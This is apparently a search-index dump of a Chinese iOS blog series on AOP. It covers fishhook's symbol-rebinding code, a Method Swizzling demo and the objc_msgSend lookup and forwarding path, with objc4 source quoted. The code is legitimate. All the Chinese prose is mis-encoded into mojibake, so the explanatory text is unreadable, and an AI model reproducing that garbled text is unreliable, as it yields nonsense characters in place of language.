å„æ®µç»“æ„ä¸­å­˜åœ¨ç›¸å¯¹æ–‡ä»¶çš„åç§»ï¼Œé‚£æˆ‘ä»¬æ‰¾åˆ°å½“å‰é•œåƒçš„åŸºå€ï¼Œå°±å¯ä»¥è®¡ç®—å†…å­˜ä¸­å„æ®µçœŸå®åœ°å€ï¼Œè¿™é‡Œé€‰ç”¨ __LINKEDIT æ®µæ¥åšåŸºå€è®¡ç®— // linkedit å†…å­˜çœŸå®åœ°å€ = ASLR åç§» + linkedit è™šæ‹Ÿåœ°å€ // åŸºå€ = linkedit å†…å­˜çœŸå®åœ°å€ - linkedit æ–‡ä»¶åç§» uintptr_t linkedit_base = (uintptr_t)slide + linkedit_segment-\u003evmaddr - linkedit_segment-\u003efileoff; nlist_t *symtab = (nlist_t *)(linkedit_base + symtab_cmd-\u003esymoff); char *strtab = (char *)(linkedit_base + symtab_cmd-\u003estroff); // Get indirect symbol table (array of uint32_t indices into symbol table) uint32_t *indirect_symtab = (uint32_t *)(linkedit_base + dysymtab_cmd-\u003eindirectsymoff); cur = (uintptr_t)header + sizeof(mach_header_t); // éå† __DATA_CONST å’Œ __DATA æ®µæ‰¾åˆ° __got å’Œ __la_symbol_ptr èŠ‚ï¼Œæ‰¾åˆ°åè¿›å…¥ perform_rebinding_with_section é€»è¾‘ for (uint i = 0; i \u003c header-\u003encmds; i++, cur += cur_seg_cmd-\u003ecmdsize) { cur_seg_cmd = (segment_command_t *)cur; if (cur_seg_cmd-\u003ecmd == LC_SEGMENT_ARCH_DEPENDENT) { if (strcmp(cur_seg_cmd-\u003esegname, SEG_DATA) != 0 \u0026\u0026 strcmp(cur_seg_cmd-\u003esegname, SEG_DATA_CONST) != 0) { continue; } for (uint j = 0; j \u003c cur_seg_cmd-\u003ensects; j++) { section_t *sect = (section_t *)(cur + sizeof(segment_command_t)) + j; if ((sect-\u003eflags \u0026 SECTION_TYPE) == S_LAZY_SYMBOL_POINTERS) { perform_rebinding_with_section(rebindings, sect, slide, symtab, strtab, indirect_symtab); } if ((sect-\u003eflags \u0026 SECTION_TYPE) == S_NON_LAZY_SYMBOL_POINTERS) { perform_rebinding_with_section(rebindings, sect, slide, symtab, strtab, indirect_symtab); } } } } } ä¸Šè¿°æºç ç¬¬ä¸€å¤„å¾ªç¯ä¸»è¦éå†ä¸‹å›¾çº¢æ¡†ä¸­æ®µæ‰¾åˆ° __LINKEDITã€LC_SYMTABã€LC_DYSYMTAB ç¬¬äºŒå¤„å¾ªç¯ä¸»è¦æ‰¾ got å’Œ la_symbol_ptr ä¸¤ä¸ªè¡¨ ","date":"2021-03-25","objectID":"/posts/fishhook.html:2:3","tags":["iOS","AOP"],"title":"Fishhook","uri":"/posts/fishhook.html"},{"categories":["iOS"],"content":"perform_rebinding_with_section static void perform_rebinding_with_section(struct rebindings_entry *rebindings, section_t *section, intptr_t slide, nlist_t *symtab, char *strtab, uint32_t *indirect_symtab) { const bool isDataConst = strcmp(section-\u003esegname, SEG_DATA_CONST) == 0; // ä¹‹å‰çš„åŠ¨æ€é“¾æ¥æ–‡ç« è®²åˆ°ï¼Œreserved1 ä¸º got è¡¨å¯¹åº”äº indirect symbols ä¸­ reserved1 èµ·å§‹çš„é¡¹ // å³ got[n] = inderect_symbols[n + reserved1] // è¿™é‡Œè®¡ç®—åŠ¨æ€ç¬¦å·è¡¨ä¸­ got è¡¨å¯¹åº”çš„èµ·å§‹ä½ç½®å…ƒç´  uint32_t *indirect_symbol_indices = indirect_symtab + section-\u003ereserved1; // è·å– Section64(__DATA_CONST,__got) æˆ– Section64(__DATA,__la_symbol_ptr) void **indirect_symbol_bindings = (void **)((uintptr_t)slide + section-\u003eaddr); vm_prot_t oldProtection = VM_PROT_READ; if (isDataConst) { oldProtection = get_protection(rebindings); mprotect(indirect_symbol_bindings, section-\u003esize, PROT_READ | PROT_WRITE); } for (uint i = 0; i \u003c section-\u003esize / sizeof(void *); i++) { // åŠ¨æ€ç¬¦å·è¡¨.index ==\u003e ç¬¦å·è¡¨[index] uint32_t symtab_index = indirect_symbol_indices[i]; if (symtab_index == INDIRECT_SYMBOL_ABS || symtab_index == INDIRECT_SYMBOL_LOCAL || symtab_index == (INDIRECT_SYMBOL_LOCAL | INDIRECT_SYMBOL_ABS)) { continue; } // ç¬¦å·è¡¨.index = å­—ç¬¦ååç§» ==\u003e å­—ç¬¦ä¸²è¡¨ + index uint32_t strtab_offset = symtab[symtab_index].n_un.n_strx; char *symbol_name = strtab + strtab_offset; bool symbol_name_longer_than_1 = symbol_name[0] \u0026\u0026 symbol_name[1]; struct rebindings_entry *cur = rebindings; // éå†é“¾è¡¨ while (cur) { for (uint j = 0; j \u003c cur-\u003erebindings_nel; j++) { // åŒ¹é…æ–¹æ³•å if (symbol_name_longer_than_1 \u0026\u0026 strcmp(\u0026symbol_name[1], cur-\u003erebindings[j].name) == 0) { if (cur-\u003erebindings[j].replaced != NULL \u0026\u0026 indirect_symbol_bindings[i] != cur-\u003erebindings[j].replacement) { // è®°å½•åŸå§‹è·³è½¬åœ°å€ *(cur-\u003erebindings[j].replaced) = indirect_symbol_bindings[i]; } // å°†æ–°å®ç°çš„æ–¹æ³•åœ°å€å†™åœ¨ indirect_symbol_bindings ä¸­å®Œæˆæ›¿æ¢ indirect_symbol_bindings[i] = cur-\u003erebindings[j].replacement; goto symbol_loop; } } cur = cur-\u003enext; } symbol_loop:; } if (isDataConst) { int protection = 0; if (oldProtection \u0026 VM_PROT_READ) { protection |= PROT_READ; } if (oldProtection \u0026 VM_PROT_WRITE) { protection |= PROT_WRITE; } if (oldProtection \u0026 VM_PROT_EXECUTE) { protection |= PROT_EXEC; } mprotect(indirect_symbol_bindings, section-\u003esize, protection); } } ","date":"2021-03-25","objectID":"/posts/fishhook.html:2:4","tags":["iOS","AOP"],"title":"Fishhook","uri":"/posts/fishhook.html"},{"categories":["iOS"],"content":"æ€»ç»“ å…¶å® fishhook çš„é€»è¾‘å°±æ˜¯å·²çŸ¥ç¬¦å·ï¼ˆè¦ hook çš„å‡½æ•°åï¼‰åæ¨å…¶åœ¨ _got / __la_symbol_ptr è¡¨ä¸­çš„ä½ç½®ï¼Œç„¶åå°†çœŸå®å‡½æ•°åœ°å€å†™å…¥ã€‚è€Œç¬¦å·çš„æŸ¥æ‰¾è¿‡ç¨‹åœ¨æºç å’Œæ³¨é‡Šä¸­å·²ç»ç†çš„å¾ˆæ¸…æ™°ï¼Œé€šè¿‡å®˜ç½‘çš„å›¾èƒ½æ›´ç›´è§‚çš„çœ‹å‡ºå‡ ä¸ªè¡¨ç»“æ„çš„å…³è”ã€‚ æˆ‘ä»¬è¿˜èƒ½å¾—å‡ºä¸€ä¸ªç»“è®ºï¼Œåªæœ‰å…·æœ‰ç¬¦å·å’Œç¬¦å·ç»‘å®šè¿‡ç¨‹çš„å‡½æ•°æ‰èƒ½é€šè¿‡ fishhook è¿›è¡Œ hookï¼Œè¿è¡Œæ—¶ç¬¦å·ç»‘å®šä¹Ÿæ˜¯æˆ‘ä»¬ä¹‹å‰è®²è¿‡çš„ PIC æŠ€æœ¯ã€‚å› æ­¤è‡ªå®šä¹‰çš„ C å‡½æ•°æ˜¯æ— æ³•ä½¿ç”¨ fishhook çš„ã€‚ ","date":"2021-03-25","objectID":"/posts/fishhook.html:3:0","tags":["iOS","AOP"],"title":"Fishhook","uri":"/posts/fishhook.html"},{"categories":["iOS"],"content":" iOS AOPæ–‡ç« ç³»åˆ— å‰å¯¼çŸ¥è¯†ï¼š Mach-Oæ–‡ä»¶ç»“æ„åˆ†æ é™æ€é“¾æ¥\u0026åŠ¨æ€é“¾æ¥ OCæ–¹æ³•\u0026OCç±»\u0026OCå¯¹è±¡ æ–¹æ³•æŸ¥æ‰¾å’Œæ¶ˆæ¯è½¬å‘ AOPæ¡†æ¶ï¼š Method Swizzling Fishhook Apsects NSProxy AOP ","date":"2021-03-20","objectID":"/posts/method-swizzling.html:0:0","tags":["iOS","AOP"],"title":"Method Swizzling","uri":"/posts/method-swizzling.html"},{"categories":["iOS"],"content":"iOS AOP æ¥ä¸‹æ¥çš„æ–‡ç« æˆ‘ä»¬æ­£å¼è¿›å…¥ iOS AOP çš„ä¸–ç•Œã€‚ AOP æ˜¯ä¸€ç§é¢å‘åˆ‡é¢ç¼–ç¨‹ï¼Œæ ¸å¿ƒæ€æƒ³æ˜¯åœ¨ä¸ä¿®æ”¹æºç æƒ…å†µä¸‹ç»™ç¨‹åºæ·»åŠ åŠŸèƒ½çš„æŠ€æœ¯ã€‚ æ ¹æ® OC çš„ runtime ç‰¹æ€§ï¼Œæˆ‘ä»¬å…ˆæ¥ä»‹ç»æ¯”è¾ƒåŸºç¡€çš„ä¸€ç§å®ç°æ–¹å¼ â€“ Method Swizzlingã€‚ ","date":"2021-03-20","objectID":"/posts/method-swizzling.html:1:0","tags":["iOS","AOP"],"title":"Method Swizzling","uri":"/posts/method-swizzling.html"},{"categories":["iOS"],"content":"ğŸŒ° æ¼”ç¤º æˆ‘ä»¬ä¾æ—§ä½¿ç”¨ å‰å¯¼çŸ¥è¯†æ–‡ç«  ä¸­çš„ Demoï¼Œå…ˆä¸º Person æ·»åŠ ä¸€ä¸ª Category ç±»æ¥æ‰©å±•ä¸€ä¸ª eat æ–¹æ³•ï¼Œæ¯•ç«Ÿå¹²é¥­äººé™¤äº†ç¡è¿˜è¦åƒï¼Œè¦ä¸å’Œå’¸é±¼æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Œæˆ‘ä»¬æƒ³åœ¨ äºº ç¡å‰å…ˆ åƒé¥±é¥­ï¼Œè¯¥å¦‚ä½•åˆ©ç”¨ Swizzling å®ç°å‘¢ï¼Ÿ // Person.m @implementation Person - (void)sleep { NSLog(@\"i am sleeping\"); } @end // Person+swizzle.m @implementation Person (swizzle) - (void)eat { NSLog(@\"i am eating\"); // è¿™é‡Œè°ƒç”¨è‡ªèº«å¹¶ä¸ä¼šå¯¼è‡´é€’å½’è°ƒç”¨ // å› ä¸ºåœ¨ main ä¸­äº¤æ¢äº† eat å’Œ sleep çš„ IMPï¼Œæ‰€ä»¥è¿™é‡Œå®é™…ä¸Šè°ƒç”¨çš„æ˜¯ sleep [self eat]; } @end // main.m int main(int argc, const char * argv[]) { @autoreleasepool { Person *p = [[Person alloc] init]; // äº¤æ¢ sleep å’Œ eat çš„ IMP Method ori_Method = class_getInstanceMethod([Person class], @selector(sleep)); Method new_Method = class_getInstanceMethod([Person class], @selector(eat)); method_exchangeImplementations(ori_Method, new_Method); [p sleep]; } return 0; } è¿™é‡Œè°ƒç”¨ Person çš„ sleep æ–¹æ³•ï¼Œäº¤æ¢åå®é™…è°ƒç”¨ Person+swizzle çš„ eat æ–¹æ³•ï¼Œå…ˆæ‰“å° â€œi am eatingâ€ï¼Œç„¶åæ‰§è¡Œ sleep æ–¹æ³•æ‰“å° â€œi am sleepingâ€ã€‚ å½“ç„¶è¿˜æœ‰ä¸€äº›åœ¨ runtime ä¸­çš„ API ä¹Ÿèƒ½å®ç°ç±»ä¼¼æ•ˆæœï¼š BOOL class_addMethod(Class cls, SEL name, IMP imp, const char *types) // ç±»ä¸­æ·»åŠ æ–¹æ³• IMP class_replaceMethod(Class cls, SEL name, IMP imp, const char *types) // ä¿®æ”¹ç±»æ–¹æ³• Method class_getInstanceMethod(Class aClass, SEL aSelector) // è·å–ç±»å®åŠ›æ–¹æ³• IMP method_setImplementation(Class cls, method_t *m, IMP imp) // è®¾ç½®æ–¹æ³• imp ","date":"2021-03-20","objectID":"/posts/method-swizzling.html:2:0","tags":["iOS","AOP"],"title":"Method Swizzling","uri":"/posts/method-swizzling.html"},{"categories":["iOS"],"content":"åŸç† åŸç†éå¸¸ç®€å•ï¼Œæˆ‘ä»¬çœ‹ä¸‹ method_exchangeImplementations çš„æ ¸å¿ƒå®ç°ä¸€ç›®äº†ç„¶ void method_exchangeImplementations(Method m1, Method m2) { ... IMP imp1 = m1-\u003eimp(false); IMP imp2 = m2-\u003eimp(false); SEL sel1 = m1-\u003ename(); SEL sel2 = m2-\u003ename(); m1-\u003esetImp(imp2); m2-\u003esetImp(imp1); ... } å°±æ˜¯åœ¨è¿è¡Œæ—¶ï¼Œæ”¹å˜æ–¹æ³•ç»“æ„ä½“ method_t çš„åº•å±‚å®ç° struct method_t { SEL name; // è¿è¡Œæ—¶æ–¹æ³•å const char *types; // æ–¹æ³•ç±»å‹ç¼–ç  MethodListIMP imp; // æ–¹æ³•å®ç°çš„æŒ‡é’ˆ } æ‰§è¡Œçš„æ“ä½œå›¾å½¢åŒ–ä¸º ","date":"2021-03-20","objectID":"/posts/method-swizzling.html:3:0","tags":["iOS","AOP"],"title":"Method Swizzling","uri":"/posts/method-swizzling.html"},{"categories":["iOS"],"content":"ä½¿ç”¨å»ºè®® +load Swizzling åœ¨ç±»çš„ +load æ–¹æ³•ä¸­å®Œæˆã€‚ å› ä¸º +load æ–¹æ³•ä¼šåœ¨ç±»è¢«æ·»åŠ åˆ° OC è¿è¡Œæ—¶æ‰§è¡Œï¼Œä¸”åªä¼šè¢«è°ƒç”¨ä¸€æ¬¡ï¼Œä¿è¯äº† Swizzling æ–¹æ³•çš„åŠæ—¶å¤„ç†ã€‚ dispath_once Swizzling åœ¨ dispatch_once ä¸­å®Œæˆã€‚ä¿è¯åªæ‰§è¡Œä¸€æ¬¡ã€‚ prefix Swizzling æ–¹æ³•æ·»åŠ å‰ç¼€ï¼Œé¿å…æ–¹æ³•åç§°å†²çªã€‚ invoke the original imp ä¸è°ƒç”¨åŸå§‹å®ç°å¾ˆå¯èƒ½ä¼šå¯¼è‡´ç¨‹åºçŠ¶æ€æˆ–é€»è¾‘å¼‚å¸¸ã€‚ ","date":"2021-03-20","objectID":"/posts/method-swizzling.html:4:0","tags":["iOS","AOP"],"title":"Method Swizzling","uri":"/posts/method-swizzling.html"},{"categories":["iOS"],"content":" iOS AOPæ–‡ç« ç³»åˆ— å‰å¯¼çŸ¥è¯†ï¼š Mach-Oæ–‡ä»¶ç»“æ„åˆ†æ é™æ€é“¾æ¥\u0026åŠ¨æ€é“¾æ¥ OCæ–¹æ³•\u0026OCç±»\u0026OCå¯¹è±¡ æ–¹æ³•æŸ¥æ‰¾å’Œæ¶ˆæ¯è½¬å‘ AOPæ¡†æ¶ï¼š Method Swizzling Fishhook Apsects NSProxy AOP Tip æºç åˆ†æç¯å¢ƒï¼šobjc4-818.2 æ ¹æ®ä¹‹å‰çš„æ–‡ç« æˆ‘ä»¬çŸ¥é“OCæ–¹æ³•çš„æœ¬è´¨å°±æ˜¯è°ƒç”¨ obj_msgSendï¼Œé‚£ä¹ˆæˆ‘ä»¬å…·ä½“åˆ†æä¸‹ ObjC ä¸‹æ–¹æ³•çš„æŸ¥æ‰¾å’Œè½¬å‘æœºåˆ¶ã€‚ obj_msgSend çš„å®ç°åœ¨ obj-msg-rm64.s ä¸­çš„æ±‡ç¼–ä»£ç ä¸ºï¼š ENTRY _objc_msgSend UNWIND _objc_msgSend, NoFrame cmp p0, #0 // nil check and tagged pointer check #if SUPPORT_TAGGED_POINTERS b.le LNilOrTagged // (MSB tagged pointer looks negative) #else b.eq LReturnZero #endif ldr p13, [x0] // p13 = isa GetClassFromIsa_p16 p13, 1, x0 // p16 = class LGetIsaDone: // calls imp or objc_msgSend_uncached CacheLookup NORMAL, _objc_msgSend, __objc_msgSend_uncached #if SUPPORT_TAGGED_POINTERS LNilOrTagged: b.eq LReturnZero // nil check GetTaggedClass b LGetIsaDone // SUPPORT_TAGGED_POINTERS #endif LReturnZero: // x0 is already zero mov x1, #0 movi d0, #0 movi d1, #0 movi d2, #0 movi d3, #0 ret END_ENTRY _objc_msgSend æ ¹æ®æ±‡ç¼–å’Œæ³¨é‡Šï¼Œç†å‡ºå…¶æ ¸å¿ƒä¼ªä»£ç ä¸ºï¼š id objc_msgSend(id receiver, SEL selector, ...) { if (receiver == nil) return nil; Class cls = receiver-\u003egetIsa(); // 1 imp = CacheLookup(receiver, selector); // 2 if (imp) return imp; // __objc_msgSend_uncached -\u003e MethodTableLookup -\u003e _lookUpImpOrForward imp = lookUpImpOrForward(receiver, selector, cls); // 3 return imp; } ","date":"2021-03-15","objectID":"/posts/%E6%96%B9%E6%B3%95%E6%9F%A5%E6%89%BE%E5%92%8C%E6%B6%88%E6%81%AF%E8%BD%AC%E5%8F%91.html:0:0","tags":["iOS","AOP"],"title":"æ–¹æ³•æŸ¥æ‰¾å’Œæ¶ˆæ¯è½¬å‘","uri":"/posts/%E6%96%B9%E6%B3%95%E6%9F%A5%E6%89%BE%E5%92%8C%E6%B6%88%E6%81%AF%E8%BD%AC%E5%8F%91.html"},{"categories":["iOS"],"content":"1. è·å–isa ldr p13, [x0] // p13 = isa GetClassFromIsa_p16 p13, 1, x0 // p16 = class ==\u003e Class cls = receiver-\u003egetIsa(); GetClassFromIsa_p16 æ±‡ç¼–ä»£ç ï¼š .macro GetClassFromIsa_p16 src, needs_auth, auth_address /* note: auth_address is not required if !needs_auth */ #if SUPPORT_INDEXED_ISA // Indexed isa mov p16, \\src // optimistically set dst = src tbz p16, #ISA_INDEX_IS_NPI_BIT, 1f // done if not non-pointer isa // isa in p16 is indexed adrp x10, _objc_indexed_classes@PAGE add x10, x10, _objc_indexed_classes@PAGEOFF ubfx p16, p16, #ISA_INDEX_SHIFT, #ISA_INDEX_BITS // extract index ldr p16, [x10, p16, UXTP #PTRSHIFT] // load class from array 1: #elif __LP64__ .if \\needs_auth == 0 // _cache_getImp takes an authed class already mov p16, \\src .else // 64-bit packed isa ExtractISA p16, \\src, \\auth_address .endif #else // 32-bit raw isa mov p16, \\src #endif .endmacro Cè¯­è¨€å®ç°ç‰ˆæœ¬ä¸º getIsa inline Class objc_object::getIsa() { if (fastpath(!isTaggedPointer())) return ISA(); extern objc_class OBJC_CLASS_$___NSUnrecognizedTaggedPointer; uintptr_t slot, ptr = (uintptr_t)this; Class cls; slot = (ptr \u003e\u003e _OBJC_TAG_SLOT_SHIFT) \u0026 _OBJC_TAG_SLOT_MASK; cls = objc_tag_classes[slot]; if (slowpath(cls == (Class)\u0026OBJC_CLASS_$___NSUnrecognizedTaggedPointer)) { slot = (ptr \u003e\u003e _OBJC_TAG_EXT_SLOT_SHIFT) \u0026 _OBJC_TAG_EXT_SLOT_MASK; cls = objc_tag_ext_classes[slot]; } return cls; } ","date":"2021-03-15","objectID":"/posts/%E6%96%B9%E6%B3%95%E6%9F%A5%E6%89%BE%E5%92%8C%E6%B6%88%E6%81%AF%E8%BD%AC%E5%8F%91.html:1:0","tags":["iOS","AOP"],"title":"æ–¹æ³•æŸ¥æ‰¾å’Œæ¶ˆæ¯è½¬å‘","uri":"/posts/%E6%96%B9%E6%B3%95%E6%9F%A5%E6%89%BE%E5%92%8C%E6%B6%88%E6%81%AF%E8%BD%AC%E5%8F%91.html"},{"categories":["iOS"],"content":"2. ç¼“å­˜æŸ¥æ‰¾ CacheLookup NORMAL ==\u003e imp = CacheLookup(receiver, selector); CacheLookup åŒ…å«ä¸‰ç§æ¨¡å¼ NORMAL / LOOKUP / GETIMP å…¶å…·ä½“æ±‡ç¼–é€»è¾‘å°±æ˜¯åœ¨ objc_class ç±»ç»“æ„ä½“ä¸­è·å– cache_t çš„ bucketsï¼Œå¾ªç¯æ¯”è¾ƒè¦æŸ¥æ‰¾çš„æ–¹æ³•åæ˜¯å¦åœ¨ç¼“å­˜åˆ—è¡¨ buckets ä¸­ï¼Œæ‰¾åˆ°è¿”å› impï¼Œæ²¡æœ‰æ‰¾åˆ°åˆ™è°ƒç”¨ __objc_msgSend_uncachedï¼ˆå…·ä½“æ•°æ®ç»“æ„åœ¨OCæ–¹æ³•\u0026OCç±»\u0026OCå¯¹è±¡ä¸­æŸ¥çœ‹ï¼‰ STATIC_ENTRY __objc_msgSend_uncached UNWIND __objc_msgSend_uncached, FrameWithNoSaves // THIS IS NOT A CALLABLE C FUNCTION // Out-of-band p15 is the class to search MethodTableLookup TailCallFunctionPointer x17 END_ENTRY __objc_msgSend_uncached MethodTableLookupï¼š .macro MethodTableLookup SAVE_REGS MSGSEND // lookUpImpOrForward(obj, sel, cls, LOOKUP_INITIALIZE | LOOKUP_RESOLVER) // receiver and selector already in x0 and x1 mov x2, x16 mov x3, #3 bl _lookUpImpOrForward // IMP in x0 mov x17, x0 RESTORE_REGS MSGSEND .endmacro ","date":"2021-03-15","objectID":"/posts/%E6%96%B9%E6%B3%95%E6%9F%A5%E6%89%BE%E5%92%8C%E6%B6%88%E6%81%AF%E8%BD%AC%E5%8F%91.html:2:0","tags":["iOS","AOP"],"title":"æ–¹æ³•æŸ¥æ‰¾å’Œæ¶ˆæ¯è½¬å‘","uri":"/posts/%E6%96%B9%E6%B3%95%E6%9F%A5%E6%89%BE%E5%92%8C%E6%B6%88%E6%81%AF%E8%BD%AC%E5%8F%91.html"},{"categories":["iOS"],"content":"3. æ–¹æ³•æŸ¥æ‰¾æµç¨‹ è€Œ lookUpImpOrForward ä½¿ç”¨Cå‡½æ•°å®ç°ï¼š NEVER_INLINE IMP lookUpImpOrForward(id inst, SEL sel, Class cls, int behavior) { const IMP forward_imp = (IMP)_objc_msgForward_impcache; IMP imp = nil; Class curClass; runtimeLock.assertUnlocked(); if (slowpath(!cls-\u003eisInitialized())) { // The first message sent to a class is often +new or +alloc, or +self // which goes through objc_opt_* or various optimized entry points. // // However, the class isn't realized/initialized yet at this point, // and the optimized entry points fall down through objc_msgSend, // which ends up here. // // We really want to avoid caching these, as it can cause IMP caches // to be made with a single entry forever. // // Note that this check is racy as several threads might try to // message a given class for the first time at the same time, // in which case we might cache anyway. behavior |= LOOKUP_NOCACHE; } // runtimeLock is held during isRealized and isInitialized checking // to prevent races against concurrent realization. // runtimeLock is held during method search to make // method-lookup + cache-fill atomic with respect to method addition. // Otherwise, a category could be added but ignored indefinitely because // the cache was re-filled with the old value after the cache flush on // behalf of the category. runtimeLock.lock(); // We don't want people to be able to craft a binary blob that looks like // a class but really isn't one and do a CFI attack. // // To make these harder we want to make sure this is a class that was // either built into the binary or legitimately registered through // objc_duplicateClass, objc_initializeClassPair or objc_allocateClassPair. checkIsKnownClass(cls); cls = realizeAndInitializeIfNeeded_locked(inst, cls, behavior \u0026 LOOKUP_INITIALIZE); // runtimeLock may have been dropped but is now locked again runtimeLock.assertLocked(); curClass = cls; // The code used to lookup the class's cache again right after // we take the lock but for the vast majority of the cases // evidence shows this is a miss most of the time, hence a time loss. // // The only codepath calling into this without having performed some // kind of cache lookup is class_getInstanceMethod(). for (unsigned attempts = unreasonableClassCount();;) { if (curClass-\u003ecache.isConstantOptimizedCache(/* strict */true)) { #if CONFIG_USE_PREOPT_CACHES imp = cache_getImp(curClass, sel); if (imp) goto done_unlock; curClass = curClass-\u003ecache.preoptFallbackClass(); #endif } else { // curClass method list. Method meth = getMethodNoSuper_nolock(curClass, sel); if (meth) { imp = meth-\u003eimp(false); goto done; } if (slowpath((curClass = curClass-\u003egetSuperclass()) == nil)) { // No implementation found, and method resolver didn't help. // Use forwarding. imp = forward_imp; break; } } // Halt if there is a cycle in the superclass chain. if (slowpath(--attempts == 0)) { _objc_fatal(\"Memory corruption in class list.\"); } // Superclass cache. imp = cache_getImp(curClass, sel); if (slowpath(imp == forward_imp)) { // Found a forward:: entry in a superclass. // Stop searching, but don't cache yet; call method // resolver for this class first. break; } if (fastpath(imp)) { // Found the method in a superclass. Cache it in this class. goto done; } } // No implementation found. Try method resolver once. if (slowpath(behavior \u0026 LOOKUP_RESOLVER)) { behavior ^= LOOKUP_RESOLVER; return resolveMethod_locked(inst, sel, cls, behavior); } done: if (fastpath((behavior \u0026 LOOKUP_NOCACHE) == 0)) { #if CONFIG_USE_PREOPT_CACHES while (cls-\u003ecache.isConstantOptimizedCache(/* strict */true)) { cls = cls-\u003ecache.preoptFallbackClass(); } #endif log_and_fill_cache(cls, imp, sel, inst, curClass); } done_unlock: runtimeLock.unlock(); if (slowpath((behavior \u0026 LOOKUP_NIL) \u0026\u0026 imp == forward_imp)) { return nil; } return imp; } è¿™æ˜¯ objc-runtime-new.mm ä¸­æºç ï¼Œå…¶å®å¯ä»¥ç»“åˆ objc-runtime-old.mm èƒ½æ›´æ¸…æ™°çš„ç†å‡ºå…¶é€»è¾‘ï¼š åˆå§‹åŒ– æœ¬ç±»ç¼“å­˜æŸ¥æ‰¾ æ‰¾åˆ°è¿”å› IMP æœ¬ç±»æ–¹æ³•åˆ—è¡¨æŸ¥æ‰¾ æ‰¾åˆ°è¿”å› IMP å¾ªç¯çˆ¶ç±»é“¾åœ¨çˆ¶ç±»ç¼“å­˜å’Œæ–¹æ³•åˆ—è¡¨æŸ¥æ‰¾ æ‰¾åˆ°è®°å½•è¿›ç¼“å­˜ è·å– IMPè¿”å› åŠ¨æ€æ–¹æ³•è§£æ å®ä¾‹æ–¹æ³•è§£æ ç±»æ–¹æ³•è§£æ é‡æ–°è¿›è¡Œä¸€è¾¹æ–¹æ³•æŸ¥æ‰¾æµç¨‹ æ¶ˆæ¯è½¬å‘ ","date":"2021-03-15","objectID":"/posts/%E6%96%B9%E6%B3%95%E6%9F%A5%E6%89%BE%E5%92%8C%E6%B6%88%E6%81%AF%E8%BD%AC%E5%8F%91.html:3:0","tags":["iOS","AOP"],"title":"æ–¹æ³•æŸ¥æ‰¾å’Œæ¶ˆæ¯è½¬å‘","uri":"/posts/%E6%96%B9%E6%B3%95%E6%9F%A5%E6%89%BE%E5%92%8C%E6%B6%88%E6%81%AF%E8%BD%AC%E5%8F%91.html"},{"categories":["iOS"],"content":"3.1 æŸ¥æ‰¾æœ¬ç±» // æŸ¥æ‰¾æœ¬ç±»ç¼“å­˜ if (curClass-\u003ecache.isConstantOptimizedCache(/* strict */true)) { imp = cache_getImp(curClass, sel); if (imp) goto done_unlock; ... #endif } else { // æŸ¥æ‰¾æœ¬ç±»æ–¹æ³•åˆ—è¡¨ // curClass method list. Method meth = getMethodNoSuper_nolock(curClass, sel); if (meth) { imp = meth-\u003eimp(false); goto done; } ","date":"2021-03-15","objectID":"/posts/%E6%96%B9%E6%B3%95%E6%9F%A5%E6%89%BE%E5%92%8C%E6%B6%88%E6%81%AF%E8%BD%AC%E5%8F%91.html:3:1","tags":["iOS","AOP"],"title":"æ–¹æ³•æŸ¥æ‰¾å’Œæ¶ˆæ¯è½¬å‘","uri":"/posts/%E6%96%B9%E6%B3%95%E6%9F%A5%E6%89%BE%E5%92%8C%E6%B6%88%E6%81%AF%E8%BD%AC%E5%8F%91.html"},{"categories":["iOS"],"content":"3.2 æŸ¥æ‰¾çˆ¶ç±» // Superclass cache. imp = cache_getImp(curClass, sel); if (slowpath(imp == forward_imp)) { // Found a forward:: entry in a superclass. // Stop searching, but don't cache yet; call method // resolver for this class first. break; } if (fastpath(imp)) { // Found the method in a superclass. Cache it in this class. goto done; } å…¶ä¸­ slowpath å’Œ fastpath æ˜¯ä¸¤ä¸ªå®å®šä¹‰ï¼Œå…¶ä¸»è¦ä½œç”¨æ˜¯å‘Šè¯‰ç¼–è¯‘ if ä¸­æ˜¯å¤§æ¦‚ç‡è¿˜æ˜¯å°æ¦‚ç‡äº‹ä»¶ä»è€Œä¼˜åŒ–ä»£ç  // x å¤§æ¦‚ç‡æ˜¯1 #define fastpath(x) (__builtin_expect(bool(x), 1)) // x å¤§æ¦‚ç‡æ˜¯0 #define slowpath(x) (__builtin_expect(bool(x), 0)) æ‰€ä»¥ slowpath(imp == forward_imp) å°±æ˜¯å¤§æ¦‚ç‡ imp ä¸ç­‰äº forward_imp fastpath(imp) æ˜¯ imp å¤§æ¦‚ç‡å­˜åœ¨ ","date":"2021-03-15","objectID":"/posts/%E6%96%B9%E6%B3%95%E6%9F%A5%E6%89%BE%E5%92%8C%E6%B6%88%E6%81%AF%E8%BD%AC%E5%8F%91.html:3:2","tags":["iOS","AOP"],"title":"æ–¹æ³•æŸ¥æ‰¾å’Œæ¶ˆæ¯è½¬å‘","uri":"/posts/%E6%96%B9%E6%B3%95%E6%9F%A5%E6%89%BE%E5%92%8C%E6%B6%88%E6%81%AF%E8%BD%AC%E5%8F%91.html"},{"categories":["iOS"],"content":"3.3 åŠ¨æ€æ–¹æ³•è§£æ // No implementation found. Try method resolver once. if (slowpath(behavior \u0026 LOOKUP_RESOLVER)) { behavior ^= LOOKUP_RESOLVER; return resolveMethod_locked(inst, sel, cls, behavior); } static NEVER_INLINE IMP resolveMethod_locked(id inst, SEL sel, Class cls, int behavior) { ... if (! cls-\u003eisMetaClass()) { // try [cls resolveInstanceMethod:sel] resolveInstanceMethod(inst, sel, cls); } else { // try [nonMetaClass resolveClassMethod:sel] // and [cls resolveInstanceMethod:sel] resolveClassMethod(inst, sel, cls); if (!lookUpImpOrNilTryCache(inst, sel, cls)) { resolveInstanceMethod(inst, sel, cls); } } ... } resolveMethod_locked çš„é€»è¾‘æ˜¯å¦‚æœæœ¬ç±»æ˜¯å…ƒç±»ï¼Œè°ƒç”¨ resolveInstanceMethodï¼›å¦‚æœä¸æ˜¯è¯´æ˜æ–¹æ³•æ˜¯å®ä¾‹æ–¹æ³•ï¼Œè°ƒç”¨ resolveClassMethodã€‚ static void resolveInstanceMethod(id inst, SEL sel, Class cls) { ... SEL resolve_sel = @selector(resolveInstanceMethod:); BOOL (*msg)(Class, SEL, SEL) = (typeof(msg))objc_msgSend; bool resolved = msg(cls, resolve_sel, sel); // Cache the result (good or bad) so the resolver doesn't fire next time. // +resolveInstanceMethod adds to self a.k.a. cls IMP imp = lookUpImpOrNilTryCache(inst, sel, cls); ... } å‘é€è°ƒç”¨ resolveInstanceMethod: è§£æå™¨æ–¹æ³•ï¼ˆåœ¨ NSObjcet 